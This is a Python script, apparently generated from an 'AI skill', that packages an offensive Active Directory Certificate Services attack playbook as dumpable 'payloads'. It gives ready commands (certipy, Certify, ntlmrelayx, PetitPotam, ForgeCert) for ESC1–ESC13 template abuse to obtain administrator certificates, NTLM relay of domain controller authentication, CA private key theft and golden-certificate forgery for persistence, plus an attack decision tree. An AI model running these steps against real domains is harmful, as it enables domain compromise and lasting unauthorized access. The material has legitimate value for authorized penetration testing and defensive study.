#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/active-directory-certificate-services

Skill: SKILL: AD CS Attack Playbook — Expert Guide
Desc : >-

Run:  python hack-skills-active-directory-certificate-services.py --help
      python hack-skills-active-directory-certificate-services.py --list
      python hack-skills-active-directory-certificate-services.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/active-directory-certificate-services'
TITLE = 'SKILL: AD CS Attack Playbook — Expert Guide'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: active-directory-certificate-services", "description: >-", "AD Certificate Services attack playbook. Use when targeting misconfigured AD CS for privilege escalation via ESC1-ESC13 template abuse, NTLM relay to enrollment, CA officer abuse, and certificate-based persistence."],
    'skill-ad-cs-attack-playbook-expert-guide': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based attacks that enable ESC4 (template modification)", "- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos techniques after obtaining certificates", "- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for ESC8 (relay to HTTP enrollment endpoint)", "- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for using obtained certificates for lateral movement"],
    'advanced-reference': ["Also load [ADCS_ESC_MATRIX.md](./ADCS_ESC_MATRIX.md) when you need:", "- ESC1\u2013ESC13 quick reference table with conditions, impact, and tool commands", "- One-liner exploitation commands per ESC variant", "- Detection indicators per technique"],
    '1-ad-cs-architecture-overview': ["Certificate Authority (CA)", "\u251c\u2500\u2500 Enterprise CA (AD-integrated, issues certs based on templates)", "\u2502   \u251c\u2500\u2500 Certificate Templates (define who can enroll, what EKUs, subject settings)", "\u2502   \u251c\u2500\u2500 Enrollment endpoints: HTTP (certsrv), RPC, DCOM", "\u2502   \u2514\u2500\u2500 Published in AD: CN=Public Key Services,CN=Services,CN=Configuration", "\u251c\u2500\u2500 Template Key Settings:", "\u2502   \u251c\u2500\u2500 Subject Alternative Name (SAN): who the cert represents", "\u2502   \u251c\u2500\u2500 Extended Key Usage (EKU): what the cert allows", "\u2502   \u251c\u2500\u2500 Enrollment permissions: who can request", "\u2502   \u2514\u2500\u2500 Issuance requirements: manager approval, authorized signatures", "\u2514\u2500\u2500 Certificate \u2192 Kerberos Auth Flow:", "User presents cert \u2192 PKINIT \u2192 KDC verifies \u2192 issues TGT"],
    '2-enumeration': ["```bash"],
    'certipy-recommended-comprehensive': ["certipy find -u user@domain.com -p password -dc-ip DC_IP -stdout", "certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable -stdout"],
    'certify-from-windows': ["Certify.exe find", "Certify.exe find /vulnerable", "Certify.exe cas                    # Enumerate CAs"],
    'manual-ldap-query-for-templates': ["ldapsearch -H ldap://DC_IP -D \"user@domain.com\" -w password \\", "-b \"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com\" \\", "\"(objectClass=pKICertificateTemplate)\" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage"],
    '3-esc1-enrollee-supplies-subject': ["**Condition**: Template allows enrollee to specify Subject Alternative Name (SAN) + client authentication EKU + low-privilege enrollment.", "```bash"],
    'certipy': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-template VulnTemplate -upn administrator@domain.com"],
    'certify-windows': ["Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator"],
    'authenticate-with-certificate': ["certipy auth -pfx administrator.pfx -dc-ip DC_IP"],
    'nt-hash-of-administrator': [],
    '4-esc2-any-purpose-eku': ["**Condition**: Template has \"Any Purpose\" EKU or no EKU (subordinate CA cert) + low-privilege enrollment.", "```bash"],
    'same-as-esc1-exploitation': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-template AnyPurposeTemplate -upn administrator@domain.com"],
    '5-esc3-enrollment-agent': ["**Condition**: Template allows enrollment agent certificate + another template allows enrollment on behalf of others.", "```bash"],
    'step-1-request-enrollment-agent-cert': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-template EnrollmentAgent"],
    'step-2-use-enrollment-agent-cert-to-request-on-behalf-of-admin': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-template UserTemplate -on-behalf-of 'DOMAIN\\administrator' -pfx enrollmentagent.pfx"],
    'authenticate': ["certipy auth -pfx administrator.pfx -dc-ip DC_IP"],
    '6-esc4-template-acl-misconfiguration': ["**Condition**: Low-privilege user has write access to certificate template object.", "```bash"],
    'modify-template-to-become-esc1-vulnerable': [],
    'using-certipy': ["certipy template -u user@domain.com -p password -template VulnTemplate \\", "-save-old -dc-ip DC_IP"],
    'template-is-now-esc1-exploit-as-esc1': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-template VulnTemplate -upn administrator@domain.com"],
    'restore-original-template-cleanup': ["certipy template -u user@domain.com -p password -template VulnTemplate \\", "-configuration old_config.json -dc-ip DC_IP"],
    '7-esc6-editf-attributesubjectaltname2': ["**Condition**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled \u2192 any template becomes ESC1.", "```bash"],
    'check-if-flag-is-set': ["certutil -config \"CA_HOST\\CA-NAME\" -getreg policy\\EditFlags"],
    'exploit-request-any-template-with-san': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-template User -upn administrator@domain.com"],
    '8-esc7-ca-officer-manager-permissions': ["**Condition**: User has ManageCA or ManageCertificates permission on the CA.", "```bash"],
    'with-manageca-enable-subca-template-always-allows-san': ["certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \\", "-enable-template SubCA"],
    'request-subca-cert-with-admin-san-will-be-denied-pending': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-template SubCA -upn administrator@domain.com"],
    'with-managecertificates-approve-the-pending-request': ["certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \\", "-issue-request REQUEST_ID"],
    'retrieve-the-issued-certificate': ["certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \\", "-retrieve REQUEST_ID"],
    '9-esc8-ntlm-relay-to-http-enrollment': ["**Condition**: CA has HTTP enrollment endpoint (certsrv) without HTTPS enforcement.", "```bash"],
    'setup-relay-to-enrollment-endpoint': ["ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"],
    'coerce-dc-authentication-petitpotam-printerbug-etc': ["PetitPotam.py RELAY_HOST DC01.domain.com"],
    'dc-authenticates-relay-certificate-issued-for-dc01': [],
    'authenticate-with-certificate': ["certipy auth -pfx dc01.pfx -dc-ip DC_IP"],
    'dc01-hash-dcsync': [],
    '10-esc9-esc13-newer-discoveries': [],
    'esc9-no-security-extension-strongcertificatebindingenforcement-0-1': ["Weak certificate mapping allows impersonation when `CT_FLAG_NO_SECURITY_EXTENSION` is set.", "```bash"],
    'change-victim-s-upn-to-admin-request-cert-change-back': ["certipy shadow auto -u attacker@domain.com -p pass -account victim -dc-ip DC_IP"],
    'esc10-weak-certificate-mapping-registry-based': ["Similar to ESC9 but exploits `CertificateMappingMethods` registry value on DC."],
    'esc11-ntlm-relay-to-rpc-enrollment': ["Relay NTLM to the CA's RPC interface (IF_ENFORCEENCRYPTICERTREQUEST not set).", "```bash", "ntlmrelayx.py -t \"rpc://CA_HOST\" -rpc-mode ICPR -icpr-ca-name \"CA-NAME\" \\", "-smb2support --adcs --template DomainController"],
    'esc13-oid-group-link-issuance-policy': ["Template's issuance policy OID is linked to a group \u2192 certificate grants that group membership.", "```bash", "certipy req -u user@domain.com -p pass -ca CA-NAME -target CA_HOST \\", "-template ESC13Template"],
    'certificate-grants-membership-in-linked-group': [],
    '11-certificate-based-persistence': [],
    'golden-certificate': ["With CA private key \u2192 forge any certificate.", "```bash"],
    'extract-ca-private-key-requires-admin-on-ca-server': ["certipy ca -backup -u admin@domain.com -p password -ca CA-NAME -target CA_HOST"],
    'forge-certificate-for-any-user': ["certipy forge -ca-pfx ca.pfx -upn administrator@domain.com -subject \"CN=Administrator,CN=Users,DC=domain,DC=com\""],
    'authenticate-with-forged-cert': ["certipy auth -pfx forged.pfx -dc-ip DC_IP", "**Persistence**: Valid until CA certificate expires or CA private key is rotated."],
    'forgecert-windows': ["```cmd", "ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword \"pass\" --Subject \"CN=User\" \\", "--SubjectAltName \"administrator@domain.com\" --NewCertPath forged.pfx --NewCertPassword \"pass\""],
    '12-ad-cs-attack-decision-tree': ["Targeting AD CS", "\u251c\u2500\u2500 Enumerate: certipy find -vulnerable", "\u251c\u2500\u2500 Vulnerable template found?", "\u2502   \u251c\u2500\u2500 Enrollee can set SAN + Client Auth EKU?", "\u2502   \u2502   \u2514\u2500\u2500 ESC1 \u2192 request cert with admin UPN (\u00a73)", "\u2502   \u251c\u2500\u2500 Any Purpose EKU?", "\u2502   \u2502   \u2514\u2500\u2500 ESC2 \u2192 same as ESC1 (\u00a74)", "\u2502   \u251c\u2500\u2500 Enrollment Agent template available?", "\u2502   \u2502   \u2514\u2500\u2500 ESC3 \u2192 enroll as agent, then on-behalf-of (\u00a75)", "\u2502   \u2514\u2500\u2500 OID group link in issuance policy?", "\u2502       \u2514\u2500\u2500 ESC13 \u2192 request cert for group membership (\u00a710)", "\u251c\u2500\u2500 Write access to template?", "\u2502   \u2514\u2500\u2500 ESC4 \u2192 modify template to ESC1 condition (\u00a76)", "\u251c\u2500\u2500 CA misconfiguration?", "\u2502   \u251c\u2500\u2500 EDITF_ATTRIBUTESUBJECTALTNAME2 flag?", "\u2502   \u2502   \u2514\u2500\u2500 ESC6 \u2192 any template becomes ESC1 (\u00a77)", "\u2502   \u251c\u2500\u2500 ManageCA / ManageCertificates permission?", "\u2502   \u2502   \u2514\u2500\u2500 ESC7 \u2192 enable SubCA template, approve requests (\u00a78)", "\u2502   \u2514\u2500\u2500 HTTP enrollment without HTTPS?", "\u2502       \u2514\u2500\u2500 ESC8 \u2192 NTLM relay to certsrv (\u00a79)", "\u251c\u2500\u2500 Weak certificate mapping on DC?", "\u2502   \u251c\u2500\u2500 StrongCertificateBindingEnforcement < 2?", "\u2502   \u2502   \u2514\u2500\u2500 ESC9 \u2192 UPN manipulation + cert request (\u00a710)", "\u2502   \u2514\u2500\u2500 CertificateMappingMethods misconfigured?", "\u2502       \u2514\u2500\u2500 ESC10 \u2192 similar UPN abuse (\u00a710)", "\u251c\u2500\u2500 RPC enrollment without encryption?", "\u2502   \u2514\u2500\u2500 ESC11 \u2192 NTLM relay to RPC (\u00a710)", "\u2514\u2500\u2500 Already CA admin?", "\u2514\u2500\u2500 Golden certificate for persistence (\u00a711)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()